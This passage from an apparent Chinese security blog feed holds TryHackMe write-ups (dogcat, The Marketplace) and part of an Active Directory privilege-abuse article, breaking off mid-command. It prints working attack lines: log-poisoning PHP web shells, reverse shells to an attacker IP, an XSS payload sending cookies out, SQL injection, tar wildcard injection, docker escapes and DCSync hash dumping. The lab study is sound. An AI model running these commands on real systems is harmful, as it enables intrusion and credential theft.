    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.89.86</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160045039-313432027.png" alt="image-20241018160031179"></p><p>发现开放22，80端口</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018152418808-1060650834.png" alt="image-20241018152404974"></p><p>发现点击dog或者cat，会显示一张相应的图片</p><p>先扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160059374-298481108.png" alt="image-20241018160045419"></p><p>访问<code>/cats</code>显示403，除此之外并没有什么有用的信息</p><h1>LIF导致RCE</h1><p>再次查看我们的页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161701177-2088714964.png" alt="image-20241018161647388"></p><p>在url处有个参数view，尝试一下目录穿越</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161810480-951159654.png" alt="image-20241018161756644"></p><p>有效果，可以文件包含，并且默认在后面加<code>.php</code>文件后缀了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161932049-1336654229.png" alt="image-20241018161918408"></p><p>测试后发现可以通过<code>%00</code>可以截断</p><p>使用伪协议尝试读取源码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162225948-1416006650.png" alt="image-20241018162212286"></p><p>base64解码一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162330439-314328065.png" alt="image-20241018162316656"></p><p>尝试读取一下别的文件</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog/../index</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162600495-2121576637.png" alt="image-20241018162546442"></p><p>发现解码后的代码，我们还可以控制<code>ext</code>变量，来控制文件后缀，所以我们就可以读取任意文件了</p><p>先读取<code>/etc/passwd</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162851221-1049120622.png" alt="image-20241018162837485"></p><p>看源码比较清晰一点</p><p>这里貌似没什么信息，查看一下日志</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure><p>最终找到了<code>apache2</code>的日志</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163529321-1675570605.png" alt="image-20241018163515318"></p><p>在最后发现我们的操作会被记录下来，并且请求头的信息也保存了</p><p>尝试更改请求头试一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163851053-760002723.png" alt="image-20241018163836959"></p><p>我们自定义的请求头被写入到日志文件中了，尝试写入php代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164041488-425159992.png" alt="image-20241018164027252"></p><p>成功RCE！</p><h1>获得初始访问权限</h1><p>先将RCE完善一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018165138954-1219496020.png" alt="image-20241018165124697"></p><p>可以执行命令，我们就尝试反弹shell，先建立个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164149123-438306846.png" alt="image-20241018164135561"></p><p>执行一下反弹shell命令（注意要url编码）</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.14.90.122&quot;</span>, <span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181125748-1188823251.png" alt="image-20241018181111610"></p><p>成功获取初始权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181201855-1454053211.png" alt="image-20241018181148117"></p><p>在当前页面找到<code>flag.php</code></p><h1>提升至root权限</h1><p>先找一下flag的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181620922-1758860058.png" alt="image-20241018181607197"></p><p>找到flag2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181644383-1741156501.png" alt="image-20241018181630748"></p><p><code>sudo -l</code>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183042873-653679545.png" alt="image-20241018183028748"></p><p>发现<code>env</code>命令具有root权限，使用<code>env</code>命令提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183104360-4899350.png" alt="image-20241018183050727"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183127751-2047869555.png" alt="image-20241018183114104"></p><p>在<code>/root</code>下找到<code>flag3.txt</code></p><h1>docker逃逸</h1><p>在根目录中找到<code>.dockerenv</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185123618-1506946845.png" alt="image-20241018185109777"></p><p>可知我们在docker内</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185222092-292349124.png" alt="image-20241018185208376"></p><p>仔细翻找文件后发现以上内容，仔细查看一下，发现像是备份文件的命令，过段时间后会发现<code>backup.tar</code>文件的修改时间改变了，推断出可能正在执行一个<code>cron</code>任务</p><p>我们可以尝试写入反弹shell的命令，并以主机上的 root 身份获取 shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; backup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018190855406-938924442.png" alt="image-20241018190841293">主机进行监听，过段时间后我们获取到了主机的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191712386-1712812147.png" alt="image-20241018191658563"></p><p>成功获取主机shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191743754-679623711.png" alt="image-20241018191730005"></p><p>在<code>/root</code>目录找到最后一个flag</p>]]></content>
    
    
    <summary type="html">TryHackMe系列之dogcat</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-The Marketplace</title>
    <link href="https://ya1orin.github.io/posts/aad874a7.html"/>
    <id>https://ya1orin.github.io/posts/aad874a7.html</id>
    <published>2024-10-17T07:31:23.000Z</published>
    <updated>2024-11-13T05:19:34.666Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.113.205</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154217241-1022693500.png" alt="image-20241017154202881"></p><p>发现有22，80，32768端口开放</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154322531-882372758.png" alt="image-20241017154309971"></p><p>先扫描目录</p><p><code>gobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154759524-796732244.png" alt="image-20241017154746973"></p><p>先创建一个普通用户查看一下相关路径，得到以下结果：</p><ul><li><code>/admin</code> 需要登录认证才能查看</li><li><code>/signup</code> 注册</li><li><code>/login</code> 登录</li><li><code>/new</code> 创建一个新列表</li><li><code>/messages</code> 查看消息</li><li><code>/contact/michael</code> 联系列表作者</li><li><code>/item/1</code> 查看具体列表的详细信息</li><li><code>/report/1</code> 向管理员报告列表</li></ul><h1>XSS钓鱼越权</h1><p>测试后发现在创建新列表的时候，<code>Description</code>的值存在存储型xss</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160338454-1233589541.png" alt="image-20241017160325926"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160357257-693709284.png" alt="image-20241017160344536"></p><p>可以利用xss得到cookie等关键信息</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160619411-1869855713.png" alt="image-20241017160607215"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160525019-1199388518.png" alt="image-20241017160512805"></p><p>发现cookie的格式像是jwt，可以使用<a href="https://jwt.io/">在线工具</a>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017161223991-2004112504.png" alt="image-20241017161211306"></p><p>想尝试将cookie伪造成admin，但是失败了</p><p>我们的商品存在存储型XSS漏洞，那么我们可以在我们的商品页面作为钓鱼页面，举报自己的商品诱导管理员审核，然后得到管理员的Cookie，提取他的Token</p><ul><li>首先，建立监听用于获取cookie</li></ul><p><code>python -m http.server</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162043360-56155628.png" alt="image-20241017162030691"></p><ul><li>然后构造XSS钓鱼页面，当有人访问的时候获取他的cookie</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.14.90.122:8000/?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code> 用于加载图像。</p><p><code>src=x</code> 设置一个无效的图像源，通常会导致加载失败。</p><p><code>onerror</code> 当图像加载失败时触发的事件。</p><p><code>this.src</code> 在图像加载失败时，将图像的 <code>src</code> 属性设置为一个 URL，即为我们构造的一个新的URL将当前页面的 cookies 作为查询参数添加到该 URL 中</p><p><code>document.cookie</code> 获取当前页面的 cookies</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162252922-660876351.png" alt="image-20241017162240509"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162337370-966054914.png" alt="image-20241017162324966"></p><p>这时我们会收到大量的cookie，现在举报商品</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162452408-1679239075.png" alt="image-20241017162440113"></p><p>发现有几条不一样的，分析一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162542667-494681323.png" alt="image-20241017162530429"></p><p>发现是admin的cookie，更换cookie</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162715518-1364164542.png" alt="image-20241017162703243"></p><p>更换后刷新页面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162747921-460184614.png" alt="image-20241017162735330"></p><p>发现多了个<code>Administrator panel</code>，现在已经成功越权到admin了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162826902-308858830.png" alt="image-20241017162814445"></p><p>点击后获得flag</p><h1>SQL注入拿shell</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163022484-117763262.png" alt="image-20241017163010291"></p><p>随便点击一个用户发现是通过get传参，<code>user</code>是参数进行查询的，判断一下是否有sql注入</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163149364-625326231.png" alt="image-20241017163137167"></p><p>可以注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163317723-1348407264.png" alt="image-20241017163305552"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163417336-620897975.png" alt="image-20241017163404953"></p><p>判断出字段数是4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163452909-662759722.png" alt="image-20241017163440726"></p><p>发现回显位置有1和2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163650303-2129390896.png" alt="image-20241017163637823"></p><p>找到数据库名<code>marketplace</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163725041-1630260119.png" alt="image-20241017163712870"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;messages&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163755877-1253692693.png" alt="image-20241017163743652"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;,&#x27;</span>,id,is_read,message_content,user_from,user_to),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> marketplace.messages limit <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163858140-647301558.png" alt="image-20241017163845970"></p><p>找到了<code>jake</code>用户的ssh密码<code>@b_ENXkGYUCAv3zJ</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jake@10.10.113.205</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164154918-51511059.png" alt="image-20241017164142284"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164213325-995265159.png" alt="image-20241017164201069"></p><p>在当前目录找到<code>user.txt</code></p><h1>提升至root权限</h1><h2 id="横向移动">横向移动</h2><p>经典<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164349253-2140029166.png" alt="image-20241017164336681"></p><p>发现我们可以不使用密码以michael的身份运行<code>/opt/backups/backup.sh</code>，查看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164623416-1133329500.png" alt="image-20241017164611144"></p><p>这是一个压缩备份当前目录下的所有文件的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /opt/backups/backup.tar *</span><br></pre></td></tr></table></figure><p>可以用tar进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure><p><code>/dev/null</code> 特殊的路径，写入该文件的数据都会被丢弃，但脚本中已经定义了路径所以我们不用管</p><p><code>--checkpoint=1</code> 在归档过程中每处理一个文件时，生成一个检查点。这个选项通常用于长时间运行的 tar 操作。</p><p><code>--checkpoint-action=exec=/bin/sh</code> 在每个检查点触发时执行指定的命令。这里指定的命令是 <code>/bin/sh</code>，即启动一个新的 shell。</p><p>只要能够让<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>运行起来就行了，那么我们只用创建两个名为<code>--checkpoint=1</code>和<code>--checkpoint-action=exec=sh</code>的文件就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br><span class="line"><span class="built_in">chmod</span> 777 backup.tar</span><br><span class="line">sudo -u michael /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183620069-1667799123.png" alt="image-20241017183604622"></p><p>需要注意的是要将<code>backup.tar</code>权限设置成能允许其他用户可以访问的权限</p><p>现在就移动到<code>michael</code>权限</p><h2 id="提权至root">提权至root</h2><p><code>id</code>看下权限先</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183927283-989168472.png" alt="image-20241017183913322"></p><p>发现有个docker权限</p><p>利用docker提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --<span class="built_in">rm</span> -it alpine <span class="built_in">chroot</span> /mnt sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184042987-2077176883.png" alt="image-20241017184029556"></p><p>提权成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184117724-885437577.png" alt="image-20241017184104249"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之The Marketplace</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>域渗透中可滥用权限及其应用</title>
    <link href="https://ya1orin.github.io/posts/32b1aa46.html"/>
    <id>https://ya1orin.github.io/posts/32b1aa46.html</id>
    <published>2024-10-16T12:21:52.000Z</published>
    <updated>2024-11-03T10:19:21.645Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>滥用writeDACL 权限实现权限提升</h1><p>简介：在域环境中，如果安装Exchange后，系统会添加一个名为Microsoft Exchange Security Groups、Exchange Trusted Subsystem和Exchange Windows Permission三个组。如果获得了这三个组内任意用户的控制权限，就能够继承用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash，实现权限提升的目的。</p><p><strong>实际应用场景：</strong></p><p>通过在BloodHound中搜索“svc-alfresco”用户，我发现实际上该用户属于 Account Operators 组，该组是AD中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于Administrators或Domain Admins组的账号，也不能更改这些组。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476652454-cbd90151-2f5d-44d4-b511-936ce92fa7fd.png" alt="img"></p><p>通过下图我们可以看到从 svc-alfresco 到 Domain Admins 的路径，我们在下图中的发现exchange windows permission组完全信任Account Operators 组，因此我们可以利用Account Operators 组的权限创建一个新用户，然后把他添加到exchange windows permission组，这样我们就可以对HTB.LOCAL进行一些操作了，我们看到exchange windows permission组的成员对htb.local用有writeDACL权限， 然后我们可以利用我们新添加的用户对HTB.LOCAL的 writeDACL权限进行恶意利用，进而实现权限提升，</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476675522-224d3254-95d2-49a7-a15e-6b34a99efc6d.png" alt="img"></p><p>默认情况下，Exchange Windows Permissions安全组对安装 Exchange 的域的域对象具有 writeDACL 权限。</p><p>writeDACL 权限允许身份修改指定对象的权限（换句话说：修改 ACL），这意味着通过成为组织管理组的成员，我们能够将权限提升到域管理员的权限。<br>为了利用这一点，我们将新创建的用户帐户添加到该Exchange Windows Permission组中。Exchange Windows Permission组的成员，这允许我们修改HTB.LOCAL域的 ACL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain# 创建用户</span><br><span class="line">net group    #该命令的结果中找到了Exchange Windows Permissions组</span><br><span class="line">net group &quot;Exchange Windows Permissions&quot; popayw /add# 将用户添加到Exchange Windows Permissions组</span><br><span class="line">net localgroup #在该命令的结果中发现了Remote Management Users组</span><br><span class="line">net localgroup &#x27;Remote Management Users&#x27; popayw  /add</span><br></pre></td></tr></table></figure><p>如果我们有权修改 AD 对象的 ACL，则可以将权限分配给允许他们写入特定属性（例如包含电话号码的属性）的身份。除了为这些属性分配读/写权限外，还可以为扩展权限分配权限。这些权限是预定义的任务，例如更改密码、向邮箱发送电子邮件等权限2。通过应用以下扩展权限，还可以将任何给定帐户添加为域的复制伙伴：</p><ul><li>复制目录更改（DS-Replication-Get-Changes）</li><li>全部复制目录更改 (DS-Replication-Get-Changes-All )</li></ul><p>当我们为我们的用户帐户设置这些权限时，我们能够请求域中任何用户的密码哈希，那么具体如何获取的呢？</p><h1><strong>DCsync攻击</strong></h1><ul><li>DCSync攻击原理</li></ul><p><strong>主要利用的是域控制器之间的数据同步复制</strong></p><p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p><p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>secretsdump.py popayw:<span class="string">&#x27;123abc!&#x27;</span>@<span class="number">10.10</span>.<span class="number">10.161</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474277130-8a9b1f9b-9cf6-4513-8c72-d88025f31177.png" alt="img"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h1>滥用SeBackupPrivilege权限进行NTDS.dt卷影拷贝实现权限提升</h1><p>简介：SeBackupPrivilege权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。 启用了 SeBackupPrivilege 的调用，方无需任何基于 ACL 的安全检查，我们可以借助该权限进行NTDS.dt卷影拷贝最终实现权限提升。</p><p><strong>实际应用场景：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击的步骤大概分三步</span><br><span class="line">- 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。</span><br><span class="line">- 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥</span><br><span class="line">- 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希</span><br></pre></td></tr></table></figure><p>假如我们现在拿到了一个svc_backup用户的hash，然后我们开始使用evil-winrm尝试进行远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -10.10.10.192 -u svc_backup -H 